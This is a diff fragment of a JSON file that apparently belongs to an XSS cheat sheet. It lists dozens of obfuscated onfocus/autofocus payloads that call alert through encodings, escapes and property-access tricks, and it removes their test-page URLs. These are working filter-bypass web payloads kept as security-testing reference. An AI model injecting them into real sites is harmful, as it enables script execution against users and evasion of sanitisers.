-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20tabindex%3D1%20autofocus%20onfocus%3Dlocation%3DglobalThis.name%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "<xss> with onerror+onfocus using throw self.onerror=alert + /**/ comment as space + &#97 entity in JS (html)",
     "code": "<xss tabindex=1 autofocus onfocus=throw/**/self.onerror=&#97lert,1>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20tabindex%3D1%20autofocus%20onfocus%3Dthrow%2F%2A%2A%2Fself.onerror%3D%26%2397lert%2C1%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "<xss> with onerror+onfocus using throw frames.onerror=alert + /**/ comment as space + &#97 entity in JS (html)",
     "code": "<xss tabindex=1 autofocus onfocus=throw/**/frames.onerror=&#97lert,1>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20tabindex%3D1%20autofocus%20onfocus%3Dthrow%2F%2A%2A%2Fframes.onerror%3D%26%2397lert%2C1%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "<xss> with onerror+onfocus using throw globalThis.onerror=alert + /**/ comment as space + &#97 entity in JS (html)",
     "code": "<xss tabindex=1 autofocus onfocus=throw/**/globalThis.onerror=&#97lert,1>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20tabindex%3D1%20autofocus%20onfocus%3Dthrow%2F%2A%2A%2FglobalThis.onerror%3D%26%2397lert%2C1%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "<xss> with onerror+onfocus using throw self.onerror=alert + &#97 entity in JS + quoted handler value (html)",
     "code": "<xss tabindex=1 autofocus onfocus=\"throw self.onerror=&#97lert,1\">",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20tabindex%3D1%20autofocus%20onfocus%3D%22throw%20self.onerror%3D%26%2397lert%2C1%22%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "<xss> with onerror+onfocus using throw frames.onerror=alert + &#97 entity in JS + quoted handler value (html)",
     "code": "<xss tabindex=1 autofocus onfocus=\"throw frames.onerror=&#97lert,1\">",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20tabindex%3D1%20autofocus%20onfocus%3D%22throw%20frames.onerror%3D%26%2397lert%2C1%22%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "<xss> with onerror+onfocus using throw globalThis.onerror=alert + &#97 entity in JS + quoted handler value (html)",
     "code": "<xss tabindex=1 autofocus onfocus=\"throw globalThis.onerror=&#97lert,1\">",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20tabindex%3D1%20autofocus%20onfocus%3D%22throw%20globalThis.onerror%3D%26%2397lert%2C1%22%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "<xss> with onerror+onfocus using throw defaultView.onerror=alert + &#97 entity in JS + quoted handler value (html)",
     "code": "<xss tabindex=1 autofocus onfocus=\"throw defaultView.onerror=&#97lert,1\">",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20tabindex%3D1%20autofocus%20onfocus%3D%22throw%20defaultView.onerror%3D%26%2397lert%2C1%22%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "<xss> with onerror+onfocus using throw defaultView.onerror=alert + defaultView[] access + quoted handler value (html)",
     "code": "<xss title=aler id=t tabindex=1 autofocus onfocus=\"throw defaultView.onerror=defaultView[title+id],1\">",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20title%3Daler%20id%3Dt%20tabindex%3D1%20autofocus%20onfocus%3D%22throw%20defaultView.onerror%3DdefaultView%5Btitle%2Bid%5D%2C1%22%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "<xss> with onerror+onfocus using throw defaultView.onerror=alert + &Tab; as space + defaultView[] access (html)",
     "code": "<xss title=aler id=t tabindex=1 autofocus onfocus=throw&Tab;defaultView.onerror=defaultView[title+id],1>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20title%3Daler%20id%3Dt%20tabindex%3D1%20autofocus%20onfocus%3Dthrow%26Tab%3BdefaultView.onerror%3DdefaultView%5Btitle%2Bid%5D%2C1%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "<xss> with onerror+onfocus using throw defaultView.onerror=alert + &#32 as space + defaultView[] access (html)",
     "code": "<xss title=aler id=t tabindex=1 autofocus onfocus=throw&#32defaultView.onerror=defaultView[title+id],1>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20title%3Daler%20id%3Dt%20tabindex%3D1%20autofocus%20onfocus%3Dthrow%26%2332defaultView.onerror%3DdefaultView%5Btitle%2Bid%5D%2C1%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "<xss> with onerror+onfocus using throw self.onerror=alert + &#32 as space + self[] access (html)",
     "code": "<xss title=aler id=t tabindex=1 autofocus onfocus=throw&#32self.onerror=self[title+id],1>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20title%3Daler%20id%3Dt%20tabindex%3D1%20autofocus%20onfocus%3Dthrow%26%2332self.onerror%3Dself%5Btitle%2Bid%5D%2C1%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "<xss> with onerror+onfocus using throw globalThis.onerror=alert + &#32 as space + globalThis[] access (html)",
     "code": "<xss title=aler id=t tabindex=1 autofocus onfocus=throw&#32globalThis.onerror=globalThis[title+id],1>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20title%3Daler%20id%3Dt%20tabindex%3D1%20autofocus%20onfocus%3Dthrow%26%2332globalThis.onerror%3DglobalThis%5Btitle%2Bid%5D%2C1%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "<xss> with onerror+onfocus using throw frames.onerror=alert + &#32 as space + frames[] access (html)",
     "code": "<xss title=aler id=t tabindex=1 autofocus onfocus=throw&#32frames.onerror=frames[title+id],1>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20title%3Daler%20id%3Dt%20tabindex%3D1%20autofocus%20onfocus%3Dthrow%26%2332frames.onerror%3Dframes%5Btitle%2Bid%5D%2C1%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "<xss> with onfocus using location=title+id (&lpar; parens) (html)",
     "code": "<xss title=java id=script:ale class=rt&lpar;1&rpar; tabindex=1 autofocus onfocus=location=title+id+className>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20title%3Djava%20id%3Dscript%3Aale%20class%3Drt%26lpar%3B1%26rpar%3B%20tabindex%3D1%20autofocus%20onfocus%3Dlocation%3Dtitle%2Bid%2BclassName%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "<xss> with onfocus using location=title+id (&#40 parens) (html)",
     "code": "<xss title=java id=script:ale class=rt&#40;1&#41; tabindex=1 autofocus onfocus=location=title+id+className>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20title%3Djava%20id%3Dscript%3Aale%20class%3Drt%26%2340%3B1%26%2341%3B%20tabindex%3D1%20autofocus%20onfocus%3Dlocation%3Dtitle%2Bid%2BclassName%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "<xss> with onfocus using location=title+id (&#x28 parens) (html)",
     "code": "<xss title=java id=script:ale class=rt&#x28;1&#x29; tabindex=1 autofocus onfocus=location=title+id+className>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20title%3Djava%20id%3Dscript%3Aale%20class%3Drt%26%23x28%3B1%26%23x29%3B%20tabindex%3D1%20autofocus%20onfocus%3Dlocation%3Dtitle%2Bid%2BclassName%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "<xss> with onfocus using window[] access (html)",
     "code": "<xss tabindex=1 autofocus onfocus=window['a'+'lert'](1)>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20tabindex%3D1%20autofocus%20onfocus%3Dwindow%5B%27a%27%2B%27lert%27%5D%281%29%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "<xss> with onfocus using template-literal `a` string + window[] access (html)",
     "code": "<xss tabindex=1 autofocus onfocus=window[`a`+'lert'](1)>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20tabindex%3D1%20autofocus%20onfocus%3Dwindow%5B%60a%60%2B%27lert%27%5D%281%29%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "<xss> with onfocus using \\u0061 escape (html)",
     "code": "<xss tabindex=1 autofocus onfocus=\\u0061lert(1)>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20tabindex%3D1%20autofocus%20onfocus%3D%5Cu0061lert%281%29%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "<xss> with onfocus using \\u{0061} escape (html)",
     "code": "<xss tabindex=1 autofocus onfocus=\\u{0061}lert(1)>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20tabindex%3D1%20autofocus%20onfocus%3D%5Cu%7B0061%7Dlert%281%29%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "<xss> with onfocus using \\u{61} escape (html)",
     "code": "<xss tabindex=1 autofocus onfocus=\\u{61}lert(1)>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20tabindex%3D1%20autofocus%20onfocus%3D%5Cu%7B61%7Dlert%281%29%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "<xss> with onfocus using \\u{00000000000061} escape (html)",
     "code": "<xss tabindex=1 autofocus onfocus=\\u{00000000000061}lert(1)>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20tabindex%3D1%20autofocus%20onfocus%3D%5Cu%7B00000000000061%7Dlert%281%29%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "<xss> with onfocus using self[] access (html)",
     "code": "<xss tabindex=1 autofocus onfocus=self['a'+'lert'](1)>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20tabindex%3D1%20autofocus%20onfocus%3Dself%5B%27a%27%2B%27lert%27%5D%281%29%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "<xss> with onfocus using template-literal `a` string + self[] access (html)",
     "code": "<xss tabindex=1 autofocus onfocus=self[`${`a`}lert`](1)>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20tabindex%3D1%20autofocus%20onfocus%3Dself%5B%60%24%7B%60a%60%7Dlert%60%5D%281%29%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "<xss> with onfocus using \\a literal in string + self[] access (html)",
     "code": "<xss tabindex=1 autofocus onfocus=self['\\a'+'lert'](1)>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20tabindex%3D1%20autofocus%20onfocus%3Dself%5B%27%5Ca%27%2B%27lert%27%5D%281%29%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "<xss> with onfocus using \\x61 escape + self[] access (html)",
     "code": "<xss tabindex=1 autofocus onfocus=self['\\x61'+'lert'](1)>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20tabindex%3D1%20autofocus%20onfocus%3Dself%5B%27%5Cx61%27%2B%27lert%27%5D%281%29%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "<xss> with onfocus using \\141 octal escape + self[] access (html)",
     "code": "<xss tabindex=1 autofocus onfocus=self['\\141'+'lert'](1)>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20tabindex%3D1%20autofocus%20onfocus%3Dself%5B%27%5C141%27%2B%27lert%27%5D%281%29%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "<xss> with onfocus using /a/.source + self[] access (html)",
     "code": "<xss tabindex=1 autofocus onfocus=self[/a/.source+/lert/.source](1)>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20tabindex%3D1%20autofocus%20onfocus%3Dself%5B%2Fa%2F.source%2B%2Flert%2F.source%5D%281%29%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "<xss> with onfocus using atob.name[0] + self[] access (html)",
     "code": "<xss tabindex=1 autofocus onfocus=self[atob.name[0]+'lert'](1)>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20tabindex%3D1%20autofocus%20onfocus%3Dself%5Batob.name%5B0%5D%2B%27lert%27%5D%281%29%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "<xss> with onfocus using atob.name[0] + self[] access (html) #2",
     "code": "<xss tabindex=1 autofocus onfocus=self[atob.name[0]+'lert'](1)>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20tabindex%3D1%20autofocus%20onfocus%3Dself%5Batob.name%5B0%5D%2B%27lert%27%5D%281%29%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "<xss> with onfocus using String.fromCharCode(0x61) + self[] access (html)",
     "code": "<xss tabindex=1 autofocus onfocus=self[String.fromCharCode(0x61)+'lert'](1)>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20tabindex%3D1%20autofocus%20onfocus%3Dself%5BString.fromCharCode%280x61%29%2B%27lert%27%5D%281%29%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "<xss> with onfocus using String.fromCodePoint(0x61) + self[] access (html)",
     "code": "<xss tabindex=1 autofocus onfocus=self[String.fromCodePoint(0x61)+'lert'](1)>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20tabindex%3D1%20autofocus%20onfocus%3Dself%5BString.fromCodePoint%280x61%29%2B%27lert%27%5D%281%29%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "<xss> with onfocus using 10..toString(17) + self[] access (html)",
     "code": "<xss tabindex=1 autofocus onfocus=self[10..toString(17)+'lert'](1)>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20tabindex%3D1%20autofocus%20onfocus%3Dself%5B10..toString%2817%29%2B%27lert%27%5D%281%29%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "<xss> with onfocus using 10n.toString(17) + self[] access (html)",
     "code": "<xss tabindex=1 autofocus onfocus=self[10n.toString(17)+'lert'](1)>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20tabindex%3D1%20autofocus%20onfocus%3Dself%5B10n.toString%2817%29%2B%27lert%27%5D%281%29%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "<xss> with onfocus using 0xa.toString(17) + self[] access (html)",
     "code": "<xss tabindex=1 autofocus onfocus=self[0xa.toString(17)+'lert'](1)>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20tabindex%3D1%20autofocus%20onfocus%3Dself%5B0xa.toString%2817%29%2B%27lert%27%5D%281%29%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "<xss> with onfocus using 0b1010.toString(17) + self[] access (html)",
     "code": "<xss tabindex=1 autofocus onfocus=self[0b1010.toString(17)+'lert'](1)>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20tabindex%3D1%20autofocus%20onfocus%3Dself%5B0b1010.toString%2817%29%2B%27lert%27%5D%281%29%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "<xss> with onfocus using 0o12.toString(17) + self[] access (html)",
     "code": "<xss tabindex=1 autofocus onfocus=self[0o12.toString(17)+'lert'](1)>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20tabindex%3D1%20autofocus%20onfocus%3Dself%5B0o12.toString%2817%29%2B%27lert%27%5D%281%29%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "<xss> with onfocus using atob('YQ==') + self[] access (html)",
     "code": "<xss tabindex=1 autofocus onfocus=self[atob('YQ==')+'lert'](1)>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20tabindex%3D1%20autofocus%20onfocus%3Dself%5Batob%28%27YQ%3D%3D%27%29%2B%27lert%27%5D%281%29%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "<xss> with onfocus using unescape('%61') + self[] access (html)",
     "code": "<xss tabindex=1 autofocus onfocus=self[unescape('%61')+'lert'](1)>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20tabindex%3D1%20autofocus%20onfocus%3Dself%5Bunescape%28%27%2561%27%29%2B%27lert%27%5D%281%29%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "<xss> with onfocus using decodeURI('%61') + self[] access (html)",
     "code": "<xss tabindex=1 autofocus onfocus=self[decodeURI('%61')+'lert'](1)>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20tabindex%3D1%20autofocus%20onfocus%3Dself%5BdecodeURI%28%27%2561%27%29%2B%27lert%27%5D%281%29%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "<xss> with onfocus using decodeURIComponent('%61') + self[] access (html)",
     "code": "<xss tabindex=1 autofocus onfocus=self[decodeURIComponent('%61')+'lert'](1)>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20tabindex%3D1%20autofocus%20onfocus%3Dself%5BdecodeURIComponent%28%27%2561%27%29%2B%27lert%27%5D%281%29%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "<xss> with onfocus using +[] coercion + self[] access (html)",
     "code": "<xss tabindex=1 autofocus onfocus=self['a'+[]+'lert'](1)>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20tabindex%3D1%20autofocus%20onfocus%3Dself%5B%27a%27%2B%5B%5D%2B%27lert%27%5D%281%29%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "<xss> with onfocus using frames[] access (html)",
     "code": "<xss tabindex=1 autofocus onfocus=frames['a'+'lert'](1)>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20tabindex%3D1%20autofocus%20onfocus%3Dframes%5B%27a%27%2B%27lert%27%5D%281%29%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "<xss> with onfocus using 10n.toString(17) + defaultView[] access (html)",
     "code": "<xss tabindex=1 autofocus onfocus=defaultView[10n.toString(17)+'lert'](1)>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20tabindex%3D1%20autofocus%20onfocus%3DdefaultView%5B10n.toString%2817%29%2B%27lert%27%5D%281%29%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "<xss> with onfocus using 0xa.toString(17) + defaultView[] access (html)",
     "code": "<xss tabindex=1 autofocus onfocus=defaultView[0xa.toString(17)+'lert'](1)>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20tabindex%3D1%20autofocus%20onfocus%3DdefaultView%5B0xa.toString%2817%29%2B%27lert%27%5D%281%29%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "<xss> with onfocus using 0b1010.toString(17) + defaultView[] access (html)",
     "code": "<xss tabindex=1 autofocus onfocus=defaultView[0b1010.toString(17)+'lert'](1)>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20tabindex%3D1%20autofocus%20onfocus%3DdefaultView%5B0b1010.toString%2817%29%2B%27lert%27%5D%281%29%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "<xss> with onfocus using 0o12.toString(17) + defaultView[] access (html)",
     "code": "<xss tabindex=1 autofocus onfocus=defaultView[0o12.toString(17)+'lert'](1)>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20tabindex%3D1%20autofocus%20onfocus%3DdefaultView%5B0o12.toString%2817%29%2B%27lert%27%5D%281%29%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "<xss> with onfocus using atob('YQ==') + defaultView[] access (html)",
     "code": "<xss tabindex=1 autofocus onfocus=defaultView[atob('YQ==')+'lert'](1)>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20tabindex%3D1%20autofocus%20onfocus%3DdefaultView%5Batob%28%27YQ%3D%3D%27%29%2B%27lert%27%5D%281%29%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "<xss> with onfocus using unescape('%61') + defaultView[] access (html)",
     "code": "<xss tabindex=1 autofocus onfocus=defaultView[unescape('%61')+'lert'](1)>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20tabindex%3D1%20autofocus%20onfocus%3DdefaultView%5Bunescape%28%27%2561%27%29%2B%27lert%27%5D%281%29%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "<xss> with onfocus using decodeURI('%61') + defaultView[] access (html)",
     "code": "<xss tabindex=1 autofocus onfocus=defaultView[decodeURI('%61')+'lert'](1)>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20tabindex%3D1%20autofocus%20onfocus%3DdefaultView%5BdecodeURI%28%27%2561%27%29%2B%27lert%27%5D%281%29%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "<xss> with onfocus using decodeURIComponent('%61') + defaultView[] access (html)",
     "code": "<xss tabindex=1 autofocus onfocus=defaultView[decodeURIComponent('%61')+'lert'](1)>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20tabindex%3D1%20autofocus%20onfocus%3DdefaultView%5BdecodeURIComponent%28%27%2561%27%29%2B%27lert%27%5D%281%29%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "<xss> with onfocus using +[] coercion + defaultView[] access (html)",
     "code": "<xss tabindex=1 autofocus onfocus=defaultView['a'+[]+'lert'](1)>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20tabindex%3D1%20autofocus%20onfocus%3DdefaultView%5B%27a%27%2B%5B%5D%2B%27lert%27%5D%281%29%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "<xss> with onfocus using defaultView[] access (html)",
     "code": "<xss tabindex=1 autofocus onfocus=defaultView['a'+'lert'](1)>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20tabindex%3D1%20autofocus%20onfocus%3DdefaultView%5B%27a%27%2B%27lert%27%5D%281%29%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   }
 ]
